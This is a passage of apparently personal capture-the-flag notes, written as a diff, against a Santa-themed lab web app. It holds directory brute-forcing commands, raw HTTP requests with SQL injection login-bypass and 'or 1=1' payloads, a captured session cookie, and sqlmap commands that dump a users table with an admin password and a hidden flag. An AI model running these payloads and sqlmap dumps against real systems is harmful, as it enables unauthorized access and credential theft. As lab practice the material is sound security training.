@@ -1,0 +1,115 @@
+gobuster dir -u http://10.10.187.92:8000/ -w /usr/share/wordlists/dirb/big.txt -s "200,301,302,401"
+
+gobuster dir -u http://10.10.187.92:8000/ -w /usr/share/wordlists/dirb/big.txt -x .php 
+
+python3 dirsearch.py -u http://10.10.187.92:8000
+
+python3 dirsearch.py -u http://10.10.187.92:8000 -e php 
+
+
+Timmy
+William
+James
+
+
+/santapanel
+
+POST /santapanel HTTP/1.1
+Host: 10.10.52.64:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 31
+Origin: http://10.10.52.64:8000
+Connection: close
+Referer: http://10.10.52.64:8000/santapanel
+Upgrade-Insecure-Requests: 1
+
+username=' or true--&password=a   <---- funcionou o bypass de sql injection
+
+
+http://10.10.52.64:8000/santapanel?search=%27+order+by+1--
+' order by 1--
+
+http://10.10.52.64:8000/santapanel?search=%27+or+1%3D1+--
+' or 1=1 --
+
+Table: gitf / child
+
+github ownership 	Paul
+
+select * from gift_table where gitf = ' or 1=1--
+
+
+
+GET /santapanel?search=%27+or+1%3D1+-- HTTP/1.1
+Host: 10.10.52.64:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.10.52.64:8000/santapanel?search=%27+or+1%3D1+--
+Cookie: session=eyJhdXRoIjp0cnVlfQ.X8zkgw.ZQHAxXCkpbkKpBsw8J63KMF9s_E
+Upgrade-Insecure-Requests: 1
+
+
+
+
+GET /santapanel?search=github HTTP/1.1
+Host: 10.10.99.231:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.10.99.231:8000/santapanel
+Cookie: session=eyJhdXRoIjp0cnVlfQ.X80OFw.z7hg-LFGlipn57AL5FHgLxUlxNA
+Upgrade-Insecure-Requests: 1
+
+sqlmap -r req --tamper=space2comment --dbs
+back-end DBMS: SQLite
+
+sqlmap -r req --tamper=space2comment --tables --dbms sqlite
++--------------+
+| hidden_table |
+| sequels      |
+| users        |
++--------------+
+
+sqlmap -r req --tamper=space2comment -T users --columns  --dbms sqlite
++----------+------+
+| Column   | Type |
++----------+------+
+| password | text |
+| username | text |
++----------+------+
+
+sqlmap -r req --tamper=space2comment -T users -C username,password  --dbms sqlite --dump 
++----------+------------------+
+| username | password         |
++----------+------------------+
+| admin    | EhCNSWzzFP6sc7gB |
++----------+------------------+
+
+sqlmap -r req --tamper=space2comment -T hidden_table --columns  --dbms sqlite
++--------+------+
+| Column | Type |
++--------+------+
+| flag   | text |
++--------+------+
+
+sqlmap -r req --tamper=space2comment -T hidden_table -C flag  --dbms sqlite --dump
++-----------------------------------------+
+| flag                                    |
++-----------------------------------------+
+| thmfox{All_I_Want_for_Christmas_Is_You} |
++-----------------------------------------+
+
+
+
+
+
+
